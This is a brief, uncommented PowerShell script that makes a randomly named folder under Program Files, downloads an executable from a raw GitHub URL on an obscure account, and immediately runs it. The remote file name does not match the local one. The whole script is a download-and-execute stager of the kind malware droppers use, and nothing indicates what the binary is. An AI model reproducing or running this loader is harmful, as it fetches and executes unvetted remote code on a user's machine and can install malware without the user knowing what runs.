$targetFolder = "C:\Program Files (x86)\dhgxl"
$exePath = Join-Path $targetFolder "dhgxl.exe"

if (!(Test-Path $targetFolder)) {
    New-Item -ItemType Directory -Path $targetFolder -Force
}

$url = "https://github.com/x444z/dxgl/raw/refs/heads/main/dhxgl.exe"
Invoke-WebRequest -Uri $url -OutFile $exePath

Start-Process $exePath
exit
